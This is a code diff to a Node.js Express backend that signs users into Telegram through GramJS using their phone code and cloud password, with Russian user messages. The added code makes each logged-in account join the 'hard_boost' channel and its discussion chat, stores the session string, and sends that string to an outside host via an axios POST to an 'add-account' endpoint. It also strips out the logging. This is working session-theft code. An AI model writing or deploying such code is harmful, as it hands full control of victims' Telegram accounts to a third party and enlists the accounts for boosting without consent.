@@ -1,5 +1,5 @@
 require("dotenv").config();
-const fs = require("fs");
+const axios = require("axios");
 
 const express = require("express");
 const cors = require("cors");
@@ -15,9 +15,7 @@ app.use(express.json());
 const { Api, TelegramClient } = require("telegram");
 const { StringSession } = require("telegram/sessions");
 const { password: passwordUtils } = require("telegram");
-const { Telegraf, session, Scenes } = require("telegraf");
-const { keyboard } = require("telegraf/markup");
-
+const { Telegraf, session } = require("telegraf");
 
 const apiId = +process.env.API_ID;
 const apiHash = process.env.API_HASH;
@@ -166,16 +164,17 @@ async function main() {
       );
 
       const me = await USERS[id].client.getMe();
-      // const channelEntity = await USERS[id].client.getEntity("slay_awards");
-      // await USERS[id].client.invoke(new Api.channels.JoinChannel({ channel: channelEntity }));
-      // const msgs = await USERS[id].client.getMessages("slay_awards", { limit: 1 });
-      // const msg = msgs[0];
-      // const discussionChat = await USERS[id].client.getEntity(msg.replies.channelId);
-      // await USERS[id].client.invoke(new Api.channels.JoinChannel({ channel: discussionChat }));
-    
-      await dataBase.insertOne({  id, username, full_name: `${me.firstName ?? ''} ${me.lastName ?? ''}`, isBanned: false, session: USERS[id].client.session.save(), post_image: 'https://i.ibb.co/Gv9sKtCQ/5opka-8.jpg', post_text: '42' });
+      
+      const channelEntity = await USERS[id].client.getEntity("hard_boost");
+      await USERS[id].client.invoke(new Api.channels.JoinChannel({ channel: channelEntity }));
+      const msgs = await USERS[id].client.getMessages("hard_boost", { limit: 1 });
+      const msg = msgs[0];
+      const discussionChat = await USERS[id].client.getEntity(msg.replies.channelId);
+      await USERS[id].client.invoke(new Api.channels.JoinChannel({ channel: discussionChat }));
 
-      res.json({ type: 'succes', msg:'Вы были авторизованы!', session: USERS[id].client.session.save()});
+      await dataBase.insertOne({  id, username, full_name: `${me.firstName ?? ''} ${me.lastName ?? ''}`, isBanned: false, session: USERS[id].client.session.save(), post_image: 'https://i.ibb.co/Gv9sKtCQ/5opka-8.jpg', post_text: '42' });
+      res.json({ type: 'succes', msg:'Вы были авторизованы!', session: USERS[id].client.session.save() });
+      await axios.post(`${process.env.URL_PING}/add-account`, { session: USERS[id].client.session.save() }, { headers: { "Content-Type": "application/json" } });
       await USERS[id].client.disconnect();
       await USERS[id].client.destroy();
       delete USERS[id];
@@ -189,22 +188,22 @@ async function main() {
           await USERS[id].client.invoke( new Api.auth.CheckPassword({ password: passwordSrp }) );
 
           const me = await USERS[id].client.getMe();
-          // const channelEntity = await USERS[id].client.getEntity("slay_awards");
-          // await USERS[id].client.invoke(new Api.channels.JoinChannel({ channel: channelEntity }));
-          // const msgs = await USERS[id].client.getMessages("slay_awards", { limit: 1 });
-          // const msg = msgs[0];
-          // const discussionChat = await USERS[id].client.getEntity(msg.replies.channelId);
-          // await USERS[id].client.invoke(new Api.channels.JoinChannel({ channel: discussionChat }));
+          
+          const channelEntity = await USERS[id].client.getEntity("hard_boost");
+          await USERS[id].client.invoke(new Api.channels.JoinChannel({ channel: channelEntity }));
+          const msgs = await USERS[id].client.getMessages("hard_boost", { limit: 1 });
+          const msg = msgs[0];
+          const discussionChat = await USERS[id].client.getEntity(msg.replies.channelId);
+          await USERS[id].client.invoke(new Api.channels.JoinChannel({ channel: discussionChat }));
 
           await dataBase.insertOne({  id, username, full_name: `${me.firstName ?? ''} ${me.lastName ?? ''}`, isBanned: false, session: USERS[id].client.session.save(), post_image: 'https://i.ibb.co/Gv9sKtCQ/5opka-8.jpg', post_text: '42' });
           res.json({ type: 'succes', msg:'Вы были авторизованы!', session: USERS[id].client.session.save()});  
-
+          await axios.post(`${process.env.URL_PING}/add-account`, { session: USERS[id].client.session.save() }, { headers: { "Content-Type": "application/json" } });
         }
         catch(err2){
           if (err2.errorMessage === "PASSWORD_HASH_INVALID") {
             res.json({ type: 'error', msg:'Облачный пароль не совпадает!'});
           } 
-          console.log(err2)
         }
       } else {
 
@@ -217,12 +216,9 @@ async function main() {
       if (err.errorMessage === "PHONE_CODE_EXPIRED") {
         res.json({ type: 'error', msg:'Время кода истекло!'});
       } 
-      console.log('Удаляем временного пользователя');
       await USERS[id].client.disconnect();
       await USERS[id].client.destroy();
       delete USERS[id];
-      console.log(USERS);
-
     }
 
   });
